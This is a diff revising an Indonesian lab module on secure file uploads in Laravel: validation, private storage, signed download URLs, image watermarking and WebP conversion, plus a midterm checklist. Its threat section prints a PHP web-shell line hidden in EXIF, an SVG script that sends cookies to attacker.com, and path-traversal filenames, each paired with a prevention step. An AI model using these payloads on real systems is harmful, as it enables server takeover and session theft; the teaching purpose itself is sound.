@@ -1,5 +1,5 @@
 # MODUL PRAKTIKUM 07
-## File Management, Media Handling & Cloud Storage Abstraction
+## File Management, Media Handling, & Review Milestone Proyek
 ### Mata Kuliah: Pemrograman Web Lanjut (3 SKS)
 
 ---
@@ -7,24 +7,26 @@
 ## DAFTAR ISI
 1. [Tujuan Pembelajaran](#1-tujuan-pembelajaran)
 2. [Anatomi Filesystem Laravel 11/12 & Flysystem Abstraction](#2-anatomi-filesystem-laravel-1112--flysystem-abstraction)
-3. [Ancaman Keamanan File Upload & Best Practices Industri](#3-ancaman-keamanan-file-upload--best-practices-industri)
+3. [Ancaman Keamanan File Upload & Malware Prevention](#3-ancaman-keamanan-file-upload--malware-prevention)
 4. [Validasi Modern Menggunakan Rule File Object](#4-validasi-modern-menggunakan-rule-file-object)
 5. [Pemisahan Storage: Dokumen Publik vs Berkas Sensitif Privat](#5-pemisahan-storage-dokumen-publik-vs-berkas-sensitif-privat)
 6. [Pengamanan Berkas Privat Menggunakan Temporary Signed URLs](#6-pengamanan-berkas-privat-menggunakan-temporary-signed-urls)
-7. [Image Manipulation & Konversi WebP (Intervention Image v3)](#7-image-manipulation--konversi-webp-intervention-image-v3)
+7. [Image Manipulation: Resize, Watermarking & Konversi WebP (Intervention Image v3)](#7-image-manipulation-resize-watermarking--konversi-webp-intervention-image-v3)
 8. [Integrasi Multi-Disk Cloud Object Storage (S3 / Supabase)](#8-integrasi-multi-disk-cloud-object-storage-s3--supabase)
 9. [Troubleshooting & Gotchas di Lingkungan Produksi](#9-troubleshooting--gotchas-di-lingkungan-produksi)
+10. [Checklist Kesiapan Milestone 1 UTS (Konsolidasi Materi Minggu 1-7)](#10-checklist-kesiapan-milestone-1-uts-konsolidasi-materi-minggu-1-7)
 
 ---
 
 ## 1. TUJUAN PEMBELAJARAN
 Setelah menyelesaikan modul praktikum ini, mahasiswa diharapkan mampu:
-1. Memahami arsitektur abstraksi *Filesystem* Laravel yang berbasis Flysystem.
+1. Memahami arsitektur abstraksi *Filesystem* Laravel berbasis Flysystem.
 2. Membedakan penanganan aset publik (`storage/app/public`) dan berkas rahasia privat (`storage/app/private`).
-3. Mencegah celah kerentanan *Remote Code Execution* (RCE) dan *Path Traversal* pada modul *upload*.
+3. Mencegah berbagai vektor serangan siber pada modul upload: *Remote Code Execution* (RCE), *Path Traversal*, *Polyglot Files*, dan *SVG Stored XSS*.
 4. Mengimplementasikan pengunduhan berkas aman menggunakan *Temporary Signed URLs* dan *Streamed Responses*.
-5. Melakukan manipulasi gambar dinamis (resize dan konversi format WebP) untuk optimasi performa web.
-6. Mengonfigurasi integrasi *Cloud Object Storage* (S3 / Supabase) tanpa mengubah kode bisnis aplikasi.
+5. Melakukan manipulasi gambar dinamis (*auto-resize*, *watermarking*, *EXIF metadata stripping*, dan konversi WebP).
+6. Mengonfigurasi integrasi *Cloud Object Storage* (AWS S3 / Supabase Storage) tanpa mengubah kode bisnis aplikasi.
+7. Memvalidasi kesiapan repositori dan arsitektur kode menghadapi evaluasi Ujian Tengah Semester (UTS Milestone 1).
 
 ---
 
@@ -35,7 +37,7 @@ Pada pemrograman PHP native jadul, pengembang terbiasa memindahkan berkas menggu
 Laravel menggunakan library **Flysystem** (oleh Frank de Jonge) yang menyediakan lapisan abstraksi antarmuka berkas yang seragam. 
 
 > [!NOTE]
-> Dengan abstraksi Flysystem, kode Anda berinteraksi dengan kontrak API yang sama (`Storage::put()`, `Storage::get()`, `Storage::delete()`), baik berkas tersebut disimpan di harddisk lokal, flash drive, Amazon S3, Cloudflare R2, maupun Supabase Storage.
+> Dengan abstraksi Flysystem, kode aplikasi berinteraksi dengan kontrak API yang seragam (`Storage::put()`, `Storage::get()`, `Storage::delete()`), baik berkas tersebut disimpan di harddisk lokal, flash drive, Amazon S3, Cloudflare R2, maupun Supabase Storage.
 
 ### Struktur Direktori Penyimpanan Laravel 11/12:
 - `storage/app/private/`: Tempat penyimpanan berkas rahasia (default disk `local`). Berkas di sini **TIDAK BISA** diakses langsung melalui peramban web oleh siapapun.
@@ -47,25 +49,47 @@ Laravel menggunakan library **Flysystem** (oleh Frank de Jonge) yang menyediakan
 
 ---
 
-## 3. ANCAMAN KEAMANAN FILE UPLOAD & BEST PRACTICES INDUSTRI
+## 3. ANCAMAN KEAMANAN FILE UPLOAD & MALWARE PREVENTION
 
-Menyediakan fitur *upload* berkas sama saja dengan membuka pintu bagi pengguna luar untuk menulis berkas ke dalam server Anda. Jika tidak diproteksi dengan ketat, penyerang dapat mengeksploitasi server melalui beberapa vektor serangan:
+Menyediakan fitur *upload* berkas sama saja dengan membuka pintu bagi pihak luar untuk menulis berkas ke dalam server Anda. Jika tidak diproteksi dengan ketat, penyerang dapat mengeksploitasi server melalui beberapa vektor serangan malware dan injeksi kode:
 
 ### A. Bahaya Remote Code Execution (RCE)
-Jika penyerang berhasil mengunggah berkas `shell.php` ke folder publik, ia dapat membuka URL `https://aplikasi.com/uploads/shell.php` di peramban. Web server (Nginx/Apache) akan mengeksekusi script PHP tersebut, memberikan penyerang kendali penuh (*backdoor shell*) atas server basis data dan sistem operasi!
+Jika penyerang berhasil mengunggah berkas `shell.php` ke folder publik, ia dapat membuka URL `https://aplikasi.com/uploads/shell.php` di peramban. Web server (Nginx/Apache) akan mengeksekusi script PHP tersebut, memberikan penyerang kendali penuh (*backdoor shell*) atas server basis data dan sistem operasi.
 
-### B. Serangan Path Traversal & File Overwrite
-Jika aplikasi menggunakan nama berkas asli dari pengguna tanpa sanitasi (`$file->getClientOriginalName()`), penyerang dapat menamai berkas dengan payload traversal seperti:
+### B. Serangan Berkas Polyglot & Malware EXIF Injection
+Penyerang dapat menyisipkan payload script PHP jahat ke dalam metadata EXIF sebuah gambar JPEG yang valid:
 ```
-../../../../etc/passwd  atau  ../../public/index.php
+[Header JPEG yang Valid] + [Komentar EXIF: <?php system($_GET['cmd']); ?>]
 ```
-Aplikasi yang ceroboh akan menimpa berkas kritis sistem operasi atau berkas inti framework.
+Jika file ini diunggah dan server salah mengonfigurasi ekstensi atau mengeksekusinya, malware akan aktif. 
+**Pencegahan:** Selalu lakukan pemrosesan ulang (*re-encoding*) gambar menggunakan library seperti Intervention Image. Proses ini otomatis membuang (*strip*) seluruh metadata EXIF tersembunyi.
 
-### C. Empat Aturan Emas Keamanan File Upload:
+### C. Bahaya Berkas SVG & Serangan Stored Cross-Site Scripting (XSS)
+Berkas SVG (*Scalable Vector Graphics*) sebenarnya adalah dokumen XML. Di dalam berkas SVG, penyerang dapat menyisipkan kode JavaScript:
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('https://attacker.com/steal?cookie=' + document.cookie);
+  </script>
+</svg>
+```
+Saat admin membuka berkas SVG tersebut di peramban, script langsung dieksekusi dan sesi admin dicuri!
+**Pencegahan:** Jangan pernah mengizinkan ekstensi `svg` pada upload umum kecuali telah melewati sanitasi ketat (*XML sanitizer*).
+
+### D. Konfigurasi Web Server untuk Memblokir Eksekusi PHP di Folder Storage
+Di server produksi Nginx, blokir pengeksekusian script PHP di dalam seluruh folder upload/storage:
+```nginx
+location ~* /(uploads|storage)/.*\.php$ {
+    deny all;
+    return 404;
+}
+```
+
+### E. Empat Aturan Emas Keamanan File Upload:
 1. **Jangan Percayai Nama Berkas Klien:** Selalu buat nama acak unik di sisi server menggunakan *UUID* atau *hash* SHA-256 (`$file->hashName()`).
 2. **Validasi MIME-Type di Server:** Ekstensi `.jpg` bisa dipalsukan. Laravel memeriksa *magic bytes* berkas melalui modul PHP `fileinfo` untuk memverifikasi tipe berkas sebenarnya.
 3. **Isolasi Berkas Sensitif:** Jangan pernah menyimpan dokumen identitas (KTP, slip gaji, rekam medis) di dalam disk `public`.
-4. **Nonaktifkan Eksekusi Script:** Pastikan web server tidak diizinkan mengeksekusi script interpreter (PHP/Python) di dalam direktori penyimpanan statis.
+4. **Re-encode Media Gambar:** Konversi gambar ke WebP untuk memastikan file benar-benar gambar valid dan membersihkan malware.
 
 ---
 
@@ -91,23 +115,23 @@ class UploadIdentityDocumentRequest extends FormRequest
     public function rules(): array
     {
         return [
-            // Validasi dokumen KTP / Ijazah (PDF atau Gambar, maks 2MB)
+            // Validasi dokumen KTP / Ijazah (PDF atau Gambar, maks 3MB)
             'document' => [
                 'required',
                 File::types(['pdf', 'jpg', 'jpeg', 'png'])
-                    ->max(2 * 1024), // 2 MB (satuan kilobyte)
+                    ->max(3 * 1024), // 3 MB (satuan kilobyte)
             ],
 
-            // Validasi Avatar (Wajib gambar, maks 1MB, dimensi minimal 200x200 px)
+            // Validasi Avatar (Wajib gambar, maks 2MB, dimensi minimal 200x200 px)
             'avatar' => [
                 'nullable',
                 File::image()
                     ->min(10) // minimal 10 KB
-                    ->max(1024) // maksimal 1 MB
+                    ->max(2 * 1024) // maksimal 2 MB
                     ->dimensions(File::image()->dimensions()->minWidth(200)->minHeight(200)),
             ],
             
-            'document_type' => ['required', 'string', 'in:ktp,ijazah,transkrip'],
+            'type' => ['required', 'string', 'in:ktp,ijazah,kartu_keluarga'],
         ];
     }
 
@@ -115,7 +139,7 @@ class UploadIdentityDocumentRequest extends FormRequest
     {
         return [
             'document.required' => 'Dokumen wajib diunggah.',
-            'document.max' => 'Ukuran berkas dokumen tidak boleh melebihi 2 Megabyte.',
+            'document.max' => 'Ukuran berkas dokumen tidak boleh melebihi 3 Megabyte.',
             'avatar.dimensions' => 'Resolusi foto profil minimal adalah 200x200 pixel.',
         ];
     }
@@ -146,7 +170,6 @@ class ProfileMediaService
         }
 
         // 2. Simpan dengan nama hash otomatis di folder 'avatars'
-        // Hasil path: 'avatars/8f4b1d6...jpg' di storage/app/public/avatars/
         $path = $file->store('avatars', 'public');
 
         // 3. Simpan relative path ke database
@@ -201,30 +224,28 @@ class IdentityDocumentService
 
 Bagaimana jika pengguna yang sah (atau staf verifikator) perlu melihat dokumen KTP tersebut? Kita **tidak boleh** memindahkan berkas ke folder publik! 
 
-Solusi industri adalah **Temporary Signed URLs**: tautan unduhan yang dilengkapi tanda tangan kriptografis berbasis kunci enkripsi aplikasi (`APP_KEY`) dan memiliki masa kedaluwarsa waktu (misal: hanya berlaku 30 menit).
+Solusi industri adalah **Temporary Signed URLs**: tautan unduhan yang dilengkapi tanda tangan digital kriptografis (HMAC SHA-256) berbasis kunci enkripsi aplikasi (`APP_KEY`) dan memiliki masa kedaluwarsa waktu.
 
 ```
-URL Standar Publik:
-https://kampus.ac.id/uploads/ktp-123.pdf  <-- BERBAHAYA! Bisa diakses siapa saja jika URL ditebak
+URL Publik Biasa:
+https://kampus.ac.id/uploads/ktp-123.pdf  <-- BERBAHAYA! Bisa diakses publik tanpa login
 
 Temporary Signed URL:
 https://kampus.ac.id/documents/42/download?expires=1728212400&signature=9a8c7b6...  <-- AMAN!
-- Hanya bisa diakses selama 30 menit.
-- Jika query parameter diubah 1 karakter saja, signature menjadi tidak valid (HTTP 403 Invalid Signature).
+- Hanya berlaku selama masa expired (misal: 15-30 menit).
+- Mengubah 1 huruf di URL merusak signature -> HTTP 403 Invalid Signature.
 ```
 
-### Implementasi Generator & Controller:
-
+### Implementasi:
 #### 1. Mendaftarkan Rute di `routes/web.php`
 ```php
 use App\Http\Controllers\DocumentDownloadController;
 use Illuminate\Support\Facades\Route;
 
 Route::middleware(['auth'])->group(function () {
-    // Terapkan middleware 'signed' bawaan Laravel
     Route::get('/documents/{document}/download', [DocumentDownloadController::class, 'download'])
         ->name('documents.download')
-        ->middleware('signed');
+        ->middleware('signed'); // Otomatis validasi query parameter HMAC
 });
 ```
 
@@ -232,10 +253,9 @@ Route::middleware(['auth'])->group(function () {
 ```php
 use Illuminate\Support\Facades\URL;
 
-// Tautan hanya valid selama 30 menit ke depan
 $temporaryUrl = URL::temporarySignedRoute(
     'documents.download',
-    now()->addMinutes(30),
+    now()->addMinutes(15),
     ['document' => $document->id]
 );
 ```
@@ -254,7 +274,7 @@ class DocumentDownloadController extends Controller
 {
     public function download(Request $request, IdentityDocument $document): StreamedResponse
     {
-        // 1. Otorisasi kepemilikan dokumen (User pemilik atau Verifikator Kampus)
+        // 1. Otorisasi kepemilikan dokumen via Policy
         Gate::authorize('view', $document);
 
         // 2. Pastikan berkas fisik masih ada di disk privat
@@ -265,10 +285,10 @@ class DocumentDownloadController extends Controller
         // 3. Alirkan berkas langsung ke peramban tanpa membongkar path asli server
         return Storage::disk('local')->download(
             $document->storage_path,
-            $document->original_filename, // Nama yang muncul di dialog unduhan user
+            $document->original_filename,
             [
                 'Content-Type' => $document->mime_type,
-                'Cache-Control' => 'no-cache, private',
+                'Cache-Control' => 'no-cache, private, no-store, must-revalidate',
             ]
         );
     }
@@ -277,18 +297,19 @@ class DocumentDownloadController extends Controller
 
 ---
 
-## 7. IMAGE MANIPULATION & KONVERSI WEBP (INTERVENTION IMAGE V3)
+## 7. IMAGE MANIPULATION: RESIZE, WATERMARKING & KONVERSI WEBP (INTERVENTION IMAGE V3)
 
-Mengizinkan pengguna mengunggah foto berukuran 10 Megabyte langsung dari kamera ponsel dapat menghabiskan kuota penyimpanan server dan memperlambat waktu pemuatan halaman. Kita wajib melakukan optimasi:
+Mengizinkan pengguna mengunggah foto berukuran 10MB langsung dari kamera ponsel dapat membebani kapasitas server dan memperlambat waktu pemuatan halaman. Kita wajib melakukan optimasi:
 1. Menyesuaikan resolusi gambar (*resize / fit crop*).
-2. Mengonversi format berkas ke format modern **WebP** yang memiliki rasio kompresi 30% - 70% lebih kecil dibanding JPEG tanpa penurunan kualitas visual yang tampak.
+2. Membubuhkan **Watermark** (logo atau teks hak cipta / status verifikasi).
+3. Mengonversi format berkas ke format modern **WebP** yang menghemat bandwidth hingga 70% dan membersihkan metadata EXIF berbahaya.
 
 ### Instalasi Intervention Image v3 untuk Laravel:
 ```bash
 composer require intervention/image-laravel
 ```
 
-### Implementasi Service Optimasi Gambar: `app/Services/ImageOptimizerService.php`
+### Implementasi Service Lengkap: `app/Services/ImageMediaService.php`
 
 ```php
 namespace App\Services;
@@ -298,26 +319,57 @@ use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
 use Intervention\Image\Laravel\Facades\Image;
 
-class ImageOptimizerService
+class ImageMediaService
 {
     /**
-     * Resize avatar menjadi persegi 400x400 px, kompresi kualitas 80%, konversi ke WebP.
+     * Crop 400x400 px, bubuhkan Watermark, dan konversi ke format WebP.
      */
-    public function processAndStoreAvatar(UploadedFile $file): string
+    public function processAvatarWithWatermark(UploadedFile $file, ?string $watermarkText = 'VERIFIED'): string
     {
-        // 1. Baca berkas gambar menggunakan Intervention Image
+        // 1. Baca berkas gambar
         $image = Image::read($file);
 
-        // 2. Potong dan sesuaikan ke ukuran persegi 400x400 px (Cover Fit)
+        // 2. Potong persegi tengah (Cover Crop 400x400 px)
         $image->cover(400, 400);
 
-        // 3. Konversi ke format WebP dengan kualitas 80
+        // 3. Tambahkan Watermark Teks Dinamis di sudut kanan bawah
+        if ($watermarkText) {
+            $image->text($watermarkText, 380, 380, function ($font) {
+                $font->size(20);
+                $font->color('rgba(255, 255, 255, 0.6)');
+                $font->align('right');
+                $font->valign('bottom');
+            });
+        }
+
+        // 4. Konversi ke format WebP (Otomatis membuang metadata EXIF)
         $encodedWebp = $image->toWebp(quality: 80);
 
-        // 4. Siapkan nama unik dengan ekstensi .webp
-        $filename = 'avatars/' . Str::uuid() . '.webp';
-
         // 5. Simpan stream binary ke disk 'public'
+        $filename = 'avatars/' . Str::uuid() . '.webp';
+        Storage::disk('public')->put($filename, (string) $encodedWebp);
+
+        return $filename;
+    }
+
+    /**
+     * Menempelkan Watermark Gambar Logo Transparan (PNG) di atas gambar produk/sertifikat.
+     */
+    public function placeLogoWatermark(UploadedFile $file, string $watermarkLogoPath): string
+    {
+        $image = Image::read($file);
+
+        // Pasang logo watermark di pojok kanan bawah dengan opacity 60%
+        $image->place(
+            element: $watermarkLogoPath,
+            position: 'bottom-right',
+            offset_x: 20,
+            offset_y: 20,
+            opacity: 60
+        );
+
+        $encodedWebp = $image->toWebp(quality: 85);
+        $filename = 'certificates/' . Str::uuid() . '.webp';
         Storage::disk('public')->put($filename, (string) $encodedWebp);
 
         return $filename;
@@ -336,7 +388,7 @@ Pada skala produksi, menyimpan berkas statis di disk lokal server monolitik memi
 composer require league/flysystem-aws-s3-v3 "^3.0"
 ```
 
-### 2. Konfigurasi `config/filesystems.php` (Contoh Driver Supabase / S3)
+### 2. Konfigurasi `config/filesystems.php` (Driver Supabase / S3)
 ```php
 'disks' => [
     'local' => [
@@ -409,3 +461,23 @@ AWS_USE_PATH_STYLE_ENDPOINT=true
   sudo chown -R www-data:www-data storage bootstrap/cache
   sudo chmod -R 775 storage bootstrap/cache
   ```
+
+---
+
+## 10. CHECKLIST KESIAPAN MILESTONE 1 UTS (KONSOLIDASI MATERI MINGGU 1-7)
+
+Minggu depan adalah sesi **Ujian Tengah Semester (UTS)** yang berupa evaluasi *Midterm Project Defense / Code Review*. Gunakan matriks checklist di bawah ini untuk mengaudit proyek tim Anda sebelum dievaluasi oleh Dosen & Asisten:
+
+| Domain / Aspek | Kriteria Minimal Kelulusan Milestone 1 UTS | Status |
+| :--- | :--- | :---: |
+| **Arsitektur Kode** | • Controller ramping (*Skinny Controller* $\le 25$ baris).<br>• Validasi terpusat pada *Form Request* mandiri.<br>• Logika transaksi bisnis diisolasi di *Service Layer* yang independen dari HTTP (`$request`/`response()`).<br>• Data masukan kompleks dibungkus dalam *Data Transfer Object* (DTO) bertipe tegas. | [ ] |
+| **Database & Migration** | • Skema migrasi ternormalisasi dengan *Foreign Key Constraints* dan *Indexing* pada kolom pencarian.<br>• *Model Factories* dan *Seeder* batch chunk performa tinggi.<br>• Transaksi ACID (`DB::transaction`) dan *Pessimistic Locking* (`lockForUpdate()`) pada operasi kuota/keuangan sensitif. | [ ] |
+| **Eloquent ORM** | • Relasi kompleks diterapkan (*Polymorphic* / *Custom Pivot* / *Has-Many-Through*).<br>• Bebas masalah query **N+1** (aktifkan `Model::preventLazyLoading(! app()->isProduction())`).<br>• Menggunakan *Eager Loading* dengan sparse fieldsets dan *Local/Global Scopes*. | [ ] |
+| **Otentikasi & RBAC** | • Starter kit Laravel Breeze terpasang rapi.<br>• Sistem RBAC multi-role terimplementasi (Spatie / Policy).<br>• Hak kepemilikan data diatur ketat via *Model Policy* (`update`/`delete`).<br>• *Super Admin Bypass hook* terpasang via `Gate::before()`.<br>• Fitur keamanan aktif (*Email Verification* & *Password Confirmation*). | [ ] |
+| **Media & Storage** | • Pemisahan tegas disk `public` (avatar) dan disk `private` (dokumen rahasia KTP/Ijazah).<br>• File name di-hash dengan UUID, tidak menyimpan nama asli klien.<br>• Pengunduhan dokumen rahasia wajib melalui *Temporary Signed URLs* dengan otorisasi Policy.<br>• Optimasi gambar otomatis (Resize/Watermark/WebP). | [ ] |
+| **Git & Repositori** | • Menggunakan *Conventional Commits* yang rapi.<br>• Menggunakan fitur branch terpisah untuk tiap fitur (`feat/...`).<br>• File `README.md` repositori memuat panduan setup proyek lokal lengkap (*migration*, *seeder*, `.env.example*, `storage:link`). | [ ] |
+
+---
+
+## 11. LEMBAR TUGAS MANDIRI
+Selesaikan seluruh instruksi tugas pada [TUGAS-07.md](TUGAS-07.md) sebagai latihan pemantapan akhir sebelum menghadapi UTS.
